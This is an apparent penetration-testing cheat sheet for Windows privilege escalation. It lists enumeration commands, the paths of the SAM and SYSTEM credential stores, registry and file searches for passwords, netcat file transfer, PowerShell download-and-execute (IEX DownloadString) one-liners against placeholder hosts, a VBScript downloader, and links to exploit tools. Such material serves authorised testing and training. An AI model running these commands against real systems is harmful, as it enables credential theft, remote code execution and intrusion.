# A Cheat Sheet for Privilege Escalation in Windows

#### System architecture 
`system info` --- includes OS name, version and hotfixes installed. 

`wmic qfe` --- lists further details on hotfixes with links to relevant update notes from Windows.



#### Users & groups
`whoami` --- get current user.

`whoami /priv` --- display privileges for current user.

`net users` --- list users on current system.

`net localgroup` --- list groups on system.

`net localgroup Administrators` --- list users in the Administrators group. 

#### Locating stored credentials
`cmdkey /list` --- anything in Credential Manager?

`%SYSTEMROOT%\repair\SAM`

`%SYSTEMROOT%\System32\config\RegBack\SAM`

`%SYSTEMROOT%\System32\config\SAM`

`%SYSTEMROOT%\repair\system`

`%SYSTEMROOT%\System32\config\SYSTEM`

`%SYSTEMROOT%\System32\config\RegBack\system`



#### Programs, processes & services
`dir /a "C:\Program Files"`

`dir /a "C:\Program Files (x86)"`

`reg query HKEY_LOCAL_MACHINE\SOFTWARE`

###### Are there full permissions assigned to any of the program folders?
`icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"`

`icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"`

`icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"`

`icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"`

###### If supported, use accesschk.exe from SysInternals suite to look for world-writable folders and files:
`accesschk.exe -qwsu "Everyone" *`

`accesschk.exe -qwsu "Authenticated Users" *`

`accesschk.exe -qwsu "Users" *`

###### What processes are running?
`tasklist /svc`

`tasklist /v`

`net start`

`sc query`

###### Are there any schedules tasks? Look for non-standard tasks which can be exploited.
`schtasks /query /fo LIST 2>nul | findstr TaskName`

`dir C:\windows\tasks`

`Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`




#### Network

###### What NICs are connected?
`ipconfig /all`

`Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address`

`Get-DnsClientServerAddress -AddressFamily IPv4 | ft`

###### Firewall settings
`netsh firewall show state`

`netsh firewall show config`

`netsh advfirewall firewall show rule name=all`

`netsh advfirewall export "firewall.txt"`




#### Sensitive files
`reg query HKCU /f password /t REG_SZ /s`

`reg query HKLM /f password /t REG_SZ /s `

###### Searching files which contain 'password'
`findstr /si password *.xml *.ini *.txt *.config 2>nul`

`Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"`




#### Transfering files
###### Using Netcat:
Set up listener on receiver:

`nc -nlvp <PORT> > outputname.txt`

Post file from sender:

`nc -nv <IP> <PORT> < inputfile.txt`

###### Powershell one-liners

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://<IP><PORT>/<FILE_TO_DOWNLOAD>', '<FILENAME_TO_OUTPUT>')"`

`echo IEX(New-Object Net.WebClient).DownloadString('http://<IP><PORT>/<FILE_TO_DOWNLOAD>')`

###### VBScript to simulate Linux's wget command:

`echo strUrl = WScript.Arguments.Item(0) > wget.vbs`

`echo StrFile = WScript.Arguments.Item(1) >> wget.vbs`

`echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs`

`echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs`

`echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs`

`echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs`

`echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs`

`echo Err.Clear >> wget.vbs`

`echo Set http = Nothing >> wget.vbs`

`echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs`

`echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs`

`echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs`

`echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs`

`echo http.Open "GET", strURL, False >> wget.vbs`

`echo http.Send >> wget.vbs`

`echo varByteArray = http.ResponseBody >> wget.vbs`

`echo Set http = Nothing >> wget.vbs`

`echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs`

`echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs`

`echo strData = "" >> wget.vbs`

`echo strBuffer = "" >> wget.vbs`

`echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs`

`echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs`

`echo Next >> wget.vbs`

`echo ts.Close >> wget.vbs`




`cscript wget.vbs http://<IP>:<PORT>/<FILE_TO_DOWNLOAD> <FILENAME_TO_SAVE_AS>`


#### Enumeration scripts
PowerUp.ps1 --- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

window-exploit-suggester.py --- https://github.com/GDSSecurity/Windows-Exploit-Suggester

Sherlock.ps1 --- https://github.com/rasta-mouse/Sherlock

Watson --- https://github.com/rasta-mouse/Watson

Windows-privesc-check --- https://github.com/pentestmonkey/windows-privesc-check

JAWS --- https://github.com/411Hall/JAWS

SessionGopher.ps1 --- https://github.com/fireeye/SessionGopher




#### Pre-compiled Windows kernel exploits
https://github.com/SecWiki/windows-kernel-exploits

https://github.com/abatchy17/WindowsExploits
